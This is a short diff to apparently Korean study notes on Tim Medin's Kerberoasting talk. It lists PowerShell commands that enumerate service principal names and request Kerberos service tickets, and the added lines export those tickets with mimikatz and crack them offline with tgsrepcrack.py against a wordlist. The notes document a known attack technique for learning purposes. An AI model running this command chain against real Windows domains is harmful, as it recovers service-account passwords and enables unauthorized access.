@@ -12,4 +12,8 @@ Tim Medin 의 talk.
 PS> setspn -T medin.local -F -Q */*
 PS> Add-Type -AssemblyName System.IdentityModel
 PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/web01.medin.local"
+
+mimikatz # kerberos::list /export
+
+$ tgsrepcrack.py wordlist.txt *.kirbi
 ```
